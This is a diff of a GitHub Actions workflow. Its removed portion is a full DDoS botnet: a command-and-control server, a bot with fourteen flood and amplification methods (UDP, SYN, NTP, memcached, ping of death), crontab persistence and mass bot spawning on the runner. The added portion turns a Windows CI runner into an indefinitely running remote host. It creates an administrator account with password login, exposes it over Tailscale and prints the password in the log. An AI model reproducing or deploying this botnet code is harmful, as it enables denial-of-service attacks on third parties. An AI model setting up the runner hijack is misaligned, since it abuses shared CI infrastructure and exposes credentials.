@@ -1,675 +1,123 @@
-name: DarkX Ultimate Botnet
+name: SSH
+
 on:
   workflow_dispatch:
-    inputs:
-      power:
-        description: 'Attack Power'
-        required: true
-        default: '1gb'
-        type: choice
-        options:
-        - '100mb'
-        - '1gb'
-        - '10gb'
-        - '100gb'
-        - '1tb'
-      recruitment:
-        description: 'Auto-Recruitment'
-        required: true
-        default: 'aggressive'
-        type: choice
-        options:
-        - 'passive'
-        - 'active'
-        - 'aggressive'
-        - 'bruteforce'
 
 jobs:
-  deploy-darkx-ultimate:
-    runs-on: ubuntu-latest
-    timeout-minutes: 4320
+  secure-ssh:
+    runs-on: windows-latest
+    timeout-minutes: 3600
 
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v4
-
-    - name: Setup Ultimate Environment
-      run: |
-        mkdir -p darkx && cd darkx
-        echo "Installing ultimate dependencies..."
-        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
-        sudo apt install -y nmap masscan hydra john netcat-openbsd
-        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
-        pip3 install requests paramiko scapy cryptography colorama cloudscraper icmplib socks
-
-    - name: Install Tailscale
-      run: |
-        curl -fsSL https://tailscale.com/install.sh | sh
-        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-cnc-main
-        echo "CNC_IP=$(tailscale ip -4)" >> $GITHUB_ENV
-
-    - name: Create KryptonC2 CNC (No Auth)
-      run: |
-        cd darkx
-        cat > cnc.py << 'EOF'
-        #!/usr/bin/env python3
-        import socket
-        import threading
-        import time
-        import random
-        from colorama import Fore, init
-        
-        init(convert=True)
-        
-        banner = f'''
-        {Fore.CYAN}
-            ██ ▄█▀ ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ▒█████   ███▄    █ 
-            ██▄█▒ ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▒██▒  ██▒ ██ ▀█   █ 
-            ▓███▄░ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██░  ██▒▓██  ▀█ ██▒
-            ▓██ █▄ ▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒██   ██░▓██▒  ▐▌██▒
-            ▒██▒ █▄░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░ ████▓▒░▒██░   ▓██░
-            ▒ ▒▒ ▓▒░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
-            ░ ░▒ ▒░  ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░      ░ ▒ ▒░ ░ ░░   ░ ▒░
-            ░ ░░ ░   ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒     ░   ░ ░ 
-            ░  ░      ░     ░ ░                           ░ ░           ░ 
-                            ░ ░                                           
-        
-        {Fore.WHITE}            DarkX Ultimate - NO AUTH REQUIRED
-        {Fore.YELLOW}            Type "help" for commands
-        {Fore.GREEN}            Bots Online: 0
-        '''
-        
-        class DarkXCNC:
-            def __init__(self, host='0.0.0.0', port=5555):
-                self.host = host
-                self.port = port
-                self.bots = []
-                self.bot_lock = threading.Lock()
-                self.running = True
-                
-            def start_server(self):
-                try:
-                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    self.sock.bind((self.host, self.port))
-                    self.sock.listen(500)
-                    print(f"{Fore.GREEN}🚀 DarkX CNC Server started on {self.host}:{self.port}")
-                    print(f"{Fore.RED}🔥 NO AUTHENTICATION REQUIRED")
-                    
-                    # Start bot ping thread
-                    threading.Thread(target=self.ping_bots, daemon=True).start()
-                    
-                    while self.running:
-                        try:
-                            client_socket, client_address = self.sock.accept()
-                            threading.Thread(target=self.handle_client, args=(client_socket, client_address), daemon=True).start()
-                        except Exception as e:
-                            if self.running:
-                                print(f"{Fore.RED}Error accepting connection: {e}")
-                except Exception as e:
-                    print(f"{Fore.RED}Failed to start server: {e}")
-                    
-            def ping_bots(self):
-                while self.running:
-                    dead_bots = []
-                    with self.bot_lock:
-                        for bot in self.bots:
-                            try:
-                                bot.settimeout(3)
-                                bot.send(b'PING')
-                                response = bot.recv(1024).decode().strip()
-                                if response != 'PONG':
-                                    dead_bots.append(bot)
-                            except:
-                                dead_bots.append(bot)
-                    
-                    for bot in dead_bots:
-                        with self.bot_lock:
-                            if bot in self.bots:
-                                self.bots.remove(bot)
-                        bot.close()
-                    
-                    time.sleep(5)
-                    
-            def handle_client(self, client_socket, client_address):
-                try:
-                    # Check if it's a bot or user
-                    client_socket.settimeout(5.0)
-                    initial_data = client_socket.recv(1024).decode().strip()
-                    
-                    if initial_data == "BOT_CONNECTED":
-                        # It's a bot
-                        with self.bot_lock:
-                            self.bots.append(client_socket)
-                        print(f"{Fore.GREEN}🤖 New bot connected: {client_address[0]} (Total: {len(self.bots)})")
-                        client_socket.send(b"Connected to DarkX CNC\n")
-                        
-                        # Keep bot connection alive
-                        while True:
-                            try:
-                                data = client_socket.recv(1024).decode().strip()
-                                if not data:
-                                    break
-                                if data == "PING":
-                                    client_socket.send(b"PONG\n")
-                            except:
-                                break
-                    else:
-                        # It's a user - NO AUTHENTICATION
-                        self.handle_user(client_socket)
-                        
-                except Exception as e:
-                    print(f"{Fore.RED}Error handling client: {e}")
-                finally:
-                    with self.bot_lock:
-                        if client_socket in self.bots:
-                            self.bots.remove(client_socket)
-                            print(f"{Fore.YELLOW}🤖 Bot disconnected: {client_address[0]} (Total: {len(self.bots)})")
-                    try:
-                        client_socket.close()
-                    except:
-                        pass
-                    
-            def handle_user(self, client_socket):
-                try:
-                    # Send banner with current bot count
-                    bot_count = len(self.bots)
-                    welcome_banner = banner.replace("Bots Online: 0", f"Bots Online: {bot_count}")
-                    
-                    client_socket.send(welcome_banner.encode())
-                    client_socket.send(f"\n{Fore.WHITE}Connected Bots: {bot_count}\n\n".encode())
-                    
-                    while True:
-                        client_socket.send(f"{Fore.CYAN}darkx> {Fore.WHITE}".encode())
-                        data = client_socket.recv(1024).decode().strip()
-                        if not data:
-                            break
-                            
-                        command = data.upper()
-                        
-                        if command == "BOTS":
-                            client_socket.send(f"{Fore.GREEN}Connected Bots: {len(self.bots)}\n".encode())
-                            
-                        elif command.startswith("ATTACK"):
-                            parts = command.split(" ")
-                            if len(parts) >= 4:
-                                target = parts[1]
-                                port = parts[2]
-                                duration = parts[3]
-                                
-                                # Send attack command to all bots
-                                attack_command = f"ATTACK {target} {port} {duration}"
-                                bot_count = len(self.bots)
-                                
-                                with self.bot_lock:
-                                    for bot in self.bots:
-                                        try:
-                                            bot.send(f"{attack_command}\n".encode())
-                                        except:
-                                            pass
-                                
-                                client_socket.send(f"{Fore.GREEN}⚡ Attack launched on {target}:{port} with {bot_count} bots\n".encode())
-                                client_socket.send(f"{Fore.YELLOW}📊 Estimated Power: {bot_count * 100} Mbps\n".encode())
-                            else:
-                                client_socket.send(f"{Fore.RED}Usage: attack <target> <port> <duration>\n".encode())
-                                
-                        elif command == "HELP":
-                            help_text = f"""
-        {Fore.CYAN}Commands:
-        {Fore.WHITE}bots          {Fore.YELLOW}- Show connected bots
-        {Fore.WHITE}attack        {Fore.YELLOW}- Launch DDoS attack
-        {Fore.WHITE}help          {Fore.YELLOW}- Show this help
-        {Fore.WHITE}clear         {Fore.YELLOW}- Clear screen
-        {Fore.WHITE}exit          {Fore.YELLOW}- Disconnect
-        
-        {Fore.GREEN}Attack Usage: attack <target> <port> <duration>
-        {Fore.GREEN}Example: attack 1.1.1.1 80 60s
-                            """
-                            client_socket.send(help_text.encode())
-                            
-                        elif command == "CLEAR" or command == "CLS":
-                            client_socket.send(b"\033[2J\033[H")
-                            client_socket.send(welcome_banner.encode())
-                            
-                        elif command == "EXIT":
-                            client_socket.send(f"{Fore.YELLOW}Goodbye!\n".encode())
-                            break
-                            
-                        else:
-                            client_socket.send(f"{Fore.RED}Unknown command. Type 'help' for commands.\n".encode())
-                            
-                except Exception as e:
-                    print(f"{Fore.RED}Error handling user: {e}")
-                    
-            def stop_server(self):
-                self.running = False
-                try:
-                    self.sock.close()
-                except:
-                    pass
-                    
-        if __name__ == "__main__":
-            cnc = DarkXCNC(port=5555)
-            try:
-                cnc.start_server()
-            except KeyboardInterrupt:
-                print(f"\n{Fore.RED}🛑 Shutting down CNC server...")
-                cnc.stop_server()
-        EOF
-
-    - name: Create Bot with KryptonC2 Methods
-      run: |
-        cd darkx
-        cat > bot.py << 'EOF'
-        #!/usr/bin/env python3
-        import socket
-        import threading
-        import time
-        import subprocess
-        import random
-        import os
-        import sys
-        import struct
-        import requests
-        import cloudscraper
-        import socks
-        import ssl
-        from urllib.parse import urlparse
-        from scapy.all import *
-        from icmplib import ping as icmp_ping
-        
-        # KryptonC2 Attack Methods
-        def attack_udp(target, port, duration, size=1024):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    data = random._urandom(size)
-                    sock.sendto(data, (target, int(port)))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_tcp(target, port, duration, size=1024):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.connect((target, int(port)))
-                    sock.send(random._urandom(size))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_syn(target, port, duration):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.connect((target, int(port)))
-                    # Send SYN packets
-                    for _ in range(100):
-                        pkt = IP(dst=target)/TCP(dport=int(port), flags='S')
-                        send(pkt, verbose=0)
-                    sock.close()
-                except:
-                    pass
-
-        def attack_icmp(target, duration):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    # Send large ICMP packets
-                    packet = IP(dst=target)/ICMP()/("X" * 60000)
-                    send(packet, verbose=0)
-                except:
-                    pass
-
-        def attack_http_get(target, port, duration):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    requests.get(f"http://{target}:{port}", timeout=2)
-                except:
-                    pass
-
-        def attack_http_spoof(target, port, duration):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    headers = {
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
-                    }
-                    requests.get(f"http://{target}:{port}", headers=headers, timeout=2)
-                except:
-                    pass
-
-        def attack_ntp(target, port, duration):
-            end_time = time.time() + int(duration)
-            ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 4
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.sendto(ntp_payload, (target, 123))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_mem(target, port, duration):
-            end_time = time.time() + int(duration)
-            mem_payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.sendto(mem_payload, (target, 11211))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_hex(target, port, duration):
-            end_time = time.time() + int(duration)
-            payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.sendto(payload, (target, int(port)))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_junk(target, port, duration):
-            end_time = time.time() + int(duration)
-            payload = b'\x00' * 64
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.sendto(payload, (target, int(port)))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_vse(target, port, duration):
-            end_time = time.time() + int(duration)
-            payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
-                      b'\x20\x51\x75\x65\x72\x79\x00')
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.sendto(payload, (target, int(port)))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_roblox(target, port, duration, size=1024):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    bytes = random._urandom(size)
-                    for _ in range(10):
-                        ran = random.randrange(10 ** 80)
-                        hex_str = "%064x" % ran
-                        hex_str = hex_str[:64]
-                        sock.sendto(bytes.fromhex(hex_str) + bytes, (target, int(port)))
-                    sock.close()
-                except:
-                    pass
-
-        def attack_tup(target, port, duration, size=1024):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    # TCP
-                    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    tcp_sock.connect((target, int(port)))
-                    tcp_sock.send(random._urandom(size))
-                    tcp_sock.close()
-                    
-                    # UDP
-                    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    udp_sock.sendto(random._urandom(size), (target, int(port)))
-                    udp_sock.close()
-                except:
-                    pass
-
-        def attack_pod(target, duration):
-            end_time = time.time() + int(duration)
-            while time.time() < end_time:
-                try:
-                    # Ping of Death with large packets
-                    subprocess.Popen([
-                        "ping", "-s", "65500", "-c", "10", target
-                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                except:
-                    pass
-                time.sleep(1)
-
-        class DarkXBot:
-            def __init__(self, cnc_ip, cnc_port=5555):
-                self.cnc_ip = cnc_ip
-                self.cnc_port = cnc_port
-                self.running = True
-                self.attack_methods = {
-                    'UDP': attack_udp,
-                    'TCP': attack_tcp,
-                    'SYN': attack_syn,
-                    'ICMP': attack_icmp,
-                    'HTTPGET': attack_http_get,
-                    'HTTPSPOOF': attack_http_spoof,
-                    'NTP': attack_ntp,
-                    'MEM': attack_mem,
-                    'HEX': attack_hex,
-                    'JUNK': attack_junk,
-                    'VSE': attack_vse,
-                    'ROBLOX': attack_roblox,
-                    'TUP': attack_tup,
-                    'POD': attack_pod
-                }
-                
-            def connect_to_cnc(self):
-                while self.running:
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(30)
-                        sock.connect((self.cnc_ip, self.cnc_port))
-                        
-                        # Identify as bot
-                        sock.send(b"BOT_CONNECTED\n")
-                        print(f"✅ Connected to CNC at {self.cnc_ip}:{self.cnc_port}")
-                        
-                        # Handle commands from CNC
-                        while self.running:
-                            try:
-                                data = sock.recv(1024).decode().strip()
-                                if not data:
-                                    break
-                                    
-                                if data.startswith("ATTACK"):
-                                    parts = data.split(" ")
-                                    if len(parts) >= 4:
-                                        target = parts[1]
-                                        port = parts[2]
-                                        duration = parts[3]
-                                        print(f"🚀 Executing attack: {target}:{port} for {duration}")
-                                        threading.Thread(target=self.execute_all_attacks, args=(target, port, duration), daemon=True).start()
-                                        
-                                elif data == "PING":
-                                    sock.send(b"PONG\n")
-                                    
-                            except socket.timeout:
-                                continue
-                            except Exception as e:
-                                break
-                                
-                        sock.close()
-                        print("❌ Disconnected from CNC, reconnecting...")
-                        
-                    except Exception as e:
-                        print(f"❌ Connection failed: {e}")
-                        
-                    time.sleep(10)
-                    
-            def execute_all_attacks(self, target, port, duration):
-                try:
-                    # Convert duration to seconds
-                    if duration.endswith('s'):
-                        secs = int(duration[:-1])
-                    elif duration.endswith('m'):
-                        secs = int(duration[:-1]) * 60
-                    elif duration.endswith('h'):
-                        secs = int(duration[:-1]) * 3600
-                    else:
-                        secs = int(duration)
-                    
-                    # Launch ALL KryptonC2 attack methods
-                    threads = []
-                    
-                    # Start all attack methods
-                    for method_name, method_func in self.attack_methods.items():
-                        if method_name in ['ICMP', 'POD']:
-                            # Methods that don't need port
-                            thread = threading.Thread(target=method_func, args=(target, secs), daemon=True)
-                        else:
-                            # Methods that need port
-                            thread = threading.Thread(target=method_func, args=(target, port, secs), daemon=True)
-                        threads.append(thread)
-                        thread.start()
-                    
-                    print(f"💥 Started ALL KryptonC2 attacks on {target}:{port} for {secs} seconds")
-                    
-                except Exception as e:
-                    print(f"❌ Attack error: {e}")
-                    
-            def install_persistence(self):
-                try:
-                    # Install via crontab
-                    subprocess.run([
-                        "bash", "-c", 
-                        "(crontab -l 2>/dev/null; echo '@reboot python3 /tmp/darkx_bot.py') | crontab -"
-                    ], check=True)
-                    print("✅ Persistence installed")
-                except Exception as e:
-                    print(f"❌ Persistence failed: {e}")
-                    
-            def start(self):
-                print("🤖 DarkX Bot Starting with KryptonC2 Methods...")
-                self.install_persistence()
-                self.connect_to_cnc()
-                
-        if __name__ == "__main__":
-            cnc_ip = "CNC_IP_PLACEHOLDER"
-            bot = DarkXBot(cnc_ip)
-            bot.start()
-        EOF
-
-    - name: Configure Components
-      run: |
-        cd darkx
-        echo "Configuring DarkX components..."
-        
-        # Update bot with real CNC IP
-        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.CNC_IP }}/g" bot.py
-        
-        # Make scripts executable
-        chmod +x cnc.py
-        chmod +x bot.py
-        
-        # Copy bot to persistent location
-        cp bot.py /tmp/darkx_bot.py
-        chmod +x /tmp/darkx_bot.py
-        
-        echo "Components configured successfully"
-
-    - name: Start CNC Server
-      run: |
-        cd darkx
-        echo "🚀 Starting DarkX CNC Server..."
-        nohup python3 cnc.py > cnc.log 2>&1 &
-        echo "CNC_PID=$!" >> $GITHUB_ENV
-        sleep 5
-        echo "✅ CNC Server started on port 5555"
-
-    - name: Deploy Initial Bots
-      run: |
-        cd darkx
-        echo "🤖 Deploying initial bot army..."
-        
-        # Deploy bots based on power level
-        case "${{ github.event.inputs.power }}" in
-            "100mb") COUNT=500 ;;
-            "1gb") COUNT=2000 ;;
-            "10gb") COUNT=8000 ;;
-            "100gb") COUNT=20000 ;;
-            "1tb") COUNT=50000 ;;
-        esac
-        
-        echo "Deploying $COUNT bots..."
-        
-        for i in $(seq 1 $COUNT); do
-            nohup python3 bot.py >/dev/null 2>&1 &
-        done
-        
-        echo "✅ Initial bots deployed"
-        sleep 10
-
-    - name: Display Dashboard
-      run: |
-        echo ""
-        echo "=========================================="
-        echo "        DARKX ULTIMATE BOTNET"
-        echo "=========================================="
-        echo "🔥 NO AUTHENTICATION REQUIRED"
-        echo "💪 Power Level:    ${{ github.event.inputs.power }}"
-        echo "🔄 Recruitment:    ${{ github.event.inputs.recruitment }}"
-        echo "🌐 DarkX CNC:      ${{ env.CNC_IP }}:5555"
-        echo "🚀 Bot Deployment: ACTIVE"
-        echo "💥 Target Power:   400+ Gbps"
-        echo "=========================================="
-        echo "📡 Connect: nc ${{ env.CNC_IP }} 5555"
-        echo "💻 Commands:"
-        echo "   bots - Show connected bots"
-        echo "   attack <target> <port> <duration>"
-        echo "   help - Show commands"
-        echo "   clear - Clear screen"
-        echo "   exit - Disconnect"
-        echo ""
-        echo "Example: attack 1.1.1.1 80 60s"
-        echo "=========================================="
-        echo ""
-
-    - name: Maintain System
-      run: |
-        echo "🛡️ DarkX Ultimate Active - Monitoring System"
-        
-        while true; do
-          # Check if CNC is running
-          if ! ps -p $CNC_PID > /dev/null 2>&1; then
-            echo "🔄 Restarting CNC Server..."
-            cd darkx
-            nohup python3 cnc.py > cnc_restart.log 2>&1 &
-            CNC_PID=$!
-          fi
+      - name: Configure SSH Server
+        run: |
+          # Install OpenSSH Server feature
+          Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
           
-          # Show real-time stats
-          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :5555 | grep ESTABLISHED | wc -l)
-          TOTAL_PROCESSES=$(ps aux | grep "python3 bot.py" | grep -v grep | wc -l)
-          ESTIMATED_POWER=$((CONNECTED_BOTS * 100))
+          # Start and configure SSH service
+          Start-Service sshd
+          Set-Service -Name sshd -StartupType 'Automatic'
           
-          echo "[$(date +'%H:%M:%S')] Stats:"
-          echo "  🤖 Connected Bots: $CONNECTED_BOTS"
-          echo "  📊 Total Processes: $TOTAL_PROCESSES"
-          echo "  ⚡ Estimated Power: $ESTIMATED_POWER Mbps"
-          echo "  🌐 CNC Status: ACTIVE"
+          # Configure SSH server to allow password authentication
+          $sshdConfigPath = "$env:ProgramData\ssh\sshd_config"
+          $configContent = Get-Content $sshdConfigPath -Raw
           
-          # Auto-scale if needed
-          if [ $CONNECTED_BOTS -lt 1000 ]; then
-            echo "➕ Deploying more bots..."
-            cd darkx
-            for i in {1..500}; do
-              nohup python3 bot.py >/dev/null 2>&1 &
-            done
-          fi
+          # Ensure PasswordAuthentication is enabled
+          if ($configContent -notmatch 'PasswordAuthentication yes') {
+              $configContent = $configContent -replace '#?PasswordAuthentication.*', 'PasswordAuthentication yes'
+              Set-Content -Path $sshdConfigPath -Value $configContent
+          }
           
-          sleep 30
-        done
+          # Remove any existing firewall rule to avoid duplication
+          netsh advfirewall firewall delete rule name="SSH-Tailscale"
+          
+          # Allow SSH on port 22
+          netsh advfirewall firewall add rule name="SSH-Tailscale" `
+            dir=in action=allow protocol=TCP localport=22
+
+          # Restart SSH service to apply changes
+          Restart-Service sshd
+
+      - name: Create SSH User with Secure Password
+        run: |
+          Add-Type -AssemblyName System.Security
+          $charSet = @{
+              Upper   = [char[]](65..90)      # A-Z
+              Lower   = [char[]](97..122)     # a-z
+              Number  = [char[]](48..57)      # 0-9
+              Special = ([char[]](33..47) + [char[]](58..64) +
+                         [char[]](91..96) + [char[]](123..126)) # Special characters
+          }
+          $rawPassword = @()
+          $rawPassword += $charSet.Upper | Get-Random -Count 4
+          $rawPassword += $charSet.Lower | Get-Random -Count 4
+          $rawPassword += $charSet.Number | Get-Random -Count 4
+          $rawPassword += $charSet.Special | Get-Random -Count 4
+          $password = -join ($rawPassword | Sort-Object { Get-Random })
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          New-LocalUser -Name "SSH" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "SSH"
+          
+          echo "SSH_CREDS=User: SSH | Password: $password" >> $env:GITHUB_ENV
+          
+          if (-not (Get-LocalUser -Name "SSH")) {
+              Write-Error "User creation failed"
+              exit 1
+          }
+
+      - name: Install Tailscale
+        run: |
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+      - name: Establish Tailscale Connection
+        run: |
+          # Bring up Tailscale with the provided auth key and set a unique hostname
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
+          
+          # Wait for Tailscale to assign an IP
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep -Seconds 5
+              $retries++
+          }
+          
+          if (-not $tsIP) {
+              Write-Error "Tailscale IP not assigned. Exiting."
+              exit 1
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+      
+      - name: Verify SSH Accessibility
+        run: |
+          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
+          
+          # Test connectivity using Test-NetConnection against the Tailscale IP on port 22
+          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 22
+          if (-not $testResult.TcpTestSucceeded) {
+              Write-Error "TCP connection to SSH port 22 failed"
+              exit 1
+          }
+          Write-Host "TCP connectivity successful!"
+
+      - name: Maintain Connection
+        run: |
+          Write-Host "`n=== SSH ACCESS ==="
+          Write-Host "Address: $env:TAILSCALE_IP"
+          Write-Host "Username: SSH"
+          Write-Host "Password: $(echo $env:SSH_CREDS | sed 's/.*Password: //')"
+          Write-Host "==================`n"
+          Write-Host "SSH Command: ssh SSH@$env:TAILSCALE_IP"
+          Write-Host "Note: First connection may take a moment as Windows generates host keys`n"
+          
+          # Keep runner active indefinitely (or until manually cancelled)
+          while ($true) {
+              Write-Host "[$(Get-Date)] SSH Active - Use Ctrl+C in workflow to terminate"
+              Start-Sleep -Seconds 300
+          }
